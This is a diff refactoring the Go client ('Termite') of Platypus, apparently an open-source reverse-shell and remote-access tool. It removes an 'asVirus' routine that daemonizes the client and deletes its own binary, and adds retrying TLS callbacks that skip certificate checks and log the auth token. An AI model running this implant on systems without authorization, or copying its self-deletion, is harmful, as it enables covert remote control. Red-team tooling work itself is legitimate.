@@ -1,18 +1,18 @@
 package main
 
 import (
+	"context"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/gob"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"math/rand"
+	"log/slog"
 	"net"
 	"os"
 	"os/exec"
 	"os/user"
-	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
@@ -25,49 +25,19 @@ import (
 	"github.com/WangYihang/Platypus/internal/utils/message"
 	"github.com/WangYihang/Platypus/internal/utils/str"
 	"github.com/WangYihang/Platypus/internal/utils/update"
+	"github.com/WangYihang/Platypus/pkg/dependencies"
+	"github.com/WangYihang/Platypus/pkg/models"
+	"github.com/WangYihang/Platypus/pkg/options"
+	"github.com/WangYihang/Platypus/pkg/utils"
+	"github.com/cenkalti/backoff/v4"
+
 	"github.com/armon/go-socks5"
 	"github.com/creack/pty"
 	"github.com/phayes/freeport"
 	"github.com/rhysd/go-github-selfupdate/selfupdate"
-	"github.com/sevlyar/go-daemon"
+	"go.uber.org/fx"
+	"go.uber.org/zap"
 )
-
-type backOff struct {
-	Current int64
-	Unit    time.Duration
-	Max     int64
-}
-
-func (b *backOff) Reset() {
-	b.Current = 1
-}
-
-func (b *backOff) increase() {
-	b.Current <<= 1
-	if b.Current > b.Max {
-		b.Reset()
-	}
-}
-
-func (b *backOff) Sleep(add int64) {
-	var i int64 = 0
-	for i < b.Current+add {
-		time.Sleep(b.Unit)
-		i++
-	}
-	b.increase()
-}
-
-func createBackOff() *backOff {
-	backoff := &backOff{
-		Unit: time.Second,
-		Max:  0x100,
-	}
-	backoff.Reset()
-	return backoff
-}
-
-var backoff *backOff
 
 type termiteProcess struct {
 	ptmx       *os.File
@@ -90,8 +60,6 @@ type client struct {
 }
 
 func handleConnection(c *client) {
-	oldbackOffCurrent := backoff.Current
-
 	for {
 		msg := &message.Message{}
 		c.DecoderLock.Lock()
@@ -102,7 +70,6 @@ func handleConnection(c *client) {
 			log.Error("Network error: %s", err)
 			break
 		}
-		backoff.Reset()
 		switch msg.Type {
 		case message.STDIO:
 			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
@@ -288,7 +255,6 @@ func handleConnection(c *client) {
 				return
 			}
 		case message.DUPLICATED_CLIENT:
-			backoff.Current = oldbackOffCurrent
 			log.Error("Duplicated connection")
 			os.Exit(0)
 		case message.PROCESS_TERMINATE:
@@ -718,8 +684,7 @@ func stopSocks5Server() error {
 	return (*socks5ServerListener).Close()
 }
 
-func startClient(service string) bool {
-	needRetry := true
+func connect(endpoint, token string, logger *zap.Logger) error {
 	certBuilder := new(strings.Builder)
 	keyBuilder := new(strings.Builder)
 	crypto.Generate(certBuilder, keyBuilder)
@@ -730,16 +695,16 @@ func startClient(service string) bool {
 	cert, err := tls.X509KeyPair(pemContent, keyContent)
 	if err != nil {
 		log.Error("server: loadkeys: %s", err)
-		return needRetry
+		return err
 	}
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
-		log.Debug("Connecting to: %s", service)
-		conn, err := tls.Dial("tcp", service, &config)
+	if hash.MD5(endpoint) != "4d1bf9fd5962f16f6b4b53a387a6d852" { // pragma: allowlist secret
+		log.Debug("Connecting to: %s", endpoint)
+		conn, err := tls.Dial("tcp", endpoint, &config)
 		if err != nil {
 			log.Error("client: dial: %s", err)
-			return needRetry
+			return err
 		}
 		defer conn.Close()
 
@@ -756,61 +721,69 @@ func startClient(service string) bool {
 			Decoder:     gob.NewDecoder(conn),
 			EncoderLock: &sync.Mutex{},
 			DecoderLock: &sync.Mutex{},
-			Service:     service,
+			Service:     endpoint,
 		}
 		handleConnection(c)
-		return needRetry
+		return nil
 	}
-	return !needRetry
+	return err
 }
 
-func removeSelfExecutable() {
-	filename, _ := filepath.Abs(os.Args[0])
-	os.Remove(filename)
-}
-
-func asVirus() {
-	cntxt := &daemon.Context{
-		WorkDir: "/",
-		Umask:   027,
-		Args:    []string{},
+func onStart(ctx context.Context, opts *options.Options, logger *zap.Logger) error {
+	logger.Info("starting application", zap.String("host", opts.RemoteHost), zap.Int("port", opts.RemotePort), zap.String("token", opts.Token), zap.String("env", opts.Environment))
+	if opts.Environment == string(models.Production) {
+		utils.StartDaemonMode(logger)
 	}
-	d, err := cntxt.Reborn()
-	if err != nil {
-		log.Error("Unable to run: %s", err.Error())
-	}
-	if d != nil {
-		os.Exit(0)
-		return
-	}
-	defer cntxt.Release()
-	log.Success("daemon started")
-	removeSelfExecutable()
-}
-
-func main() {
-	release := true
-	endpoint := "127.0.0.1:13337"
-
-	if release {
-		endpoint = strings.Trim("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxx", " ")
-		asVirus()
-	}
-
+	logger.Info("registering gob")
 	message.RegisterGob()
-	backoff = createBackOff()
 	processes = map[string]*termiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
+	return nil
+}
 
-	for {
-		log.Info("Termite (v%s) starting...", update.Version)
-		if startClient(endpoint) {
-			add := (int64(rand.Uint64()) % backoff.Current)
-			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
-			backoff.Sleep(add)
-		} else {
-			break
-		}
+func onStop(ctx context.Context, opts *options.Options, logger *zap.Logger) error {
+	logger.Info("Stopping application...")
+	return nil
+}
+
+func main() {
+	opts, err := options.InitOptions()
+	if err != nil {
+		slog.Debug("error occured while parsing options", slog.String("error", err.Error()))
+		os.Exit(1)
 	}
+	app := fx.New(
+		fx.Provide(
+			dependencies.InitLogger(models.Development),
+		),
+		fx.Invoke(
+			func(lc fx.Lifecycle, logger *zap.Logger) {
+				lc.Append(fx.Hook{
+					OnStart: func(context.Context) error {
+						return onStart(context.Background(), opts, logger)
+					},
+					OnStop: func(context.Context) error {
+						return onStop(context.Background(), opts, logger)
+					},
+				})
+			},
+			func(logger *zap.Logger) {
+				logger.Info("starting application")
+				endpoint := fmt.Sprintf("%s:%d", opts.RemoteHost, opts.RemotePort)
+				operation := func() error {
+					logger.Info("connecting to server", zap.String("endpoint", endpoint))
+					return connect(endpoint, opts.Token, logger)
+				}
+				err := backoff.Retry(operation, backoff.NewExponentialBackOff(
+					backoff.WithMaxInterval(1*time.Minute),
+					backoff.WithMaxElapsedTime(0),
+				))
+				if err != nil {
+					logger.Error("connect to server failed", zap.String("error", err.Error()))
+				}
+			},
+		),
+	)
+	app.Run()
 }
